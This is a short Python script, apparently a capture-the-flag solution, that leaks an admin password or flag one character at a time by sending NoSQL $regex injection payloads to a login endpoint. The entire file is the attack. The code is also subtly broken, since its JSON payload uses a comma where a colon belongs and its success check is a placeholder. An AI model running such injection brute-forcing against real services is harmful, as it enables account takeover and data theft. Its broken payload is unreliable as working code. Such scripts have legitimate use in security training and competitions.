import requests
import string

leaked_data = list("CHTB{")

url = 'https://someurl.com/'

while True:
    for char in string.printable:
        if char not in ['*', '+', '.', '?', '|', '"']:
            payload = ('{"username": {"$eq": "admin"}, "password": {"$regex", "^%s"}}' % ("".join(leaked_data) + char,))
            r = requests.post(url, data=payload)
            j = r.json()
            if j[0] == 'something':
                leaked_data.append(char)
                break
            print(f"trying {''.join(leaked_data) + char}")
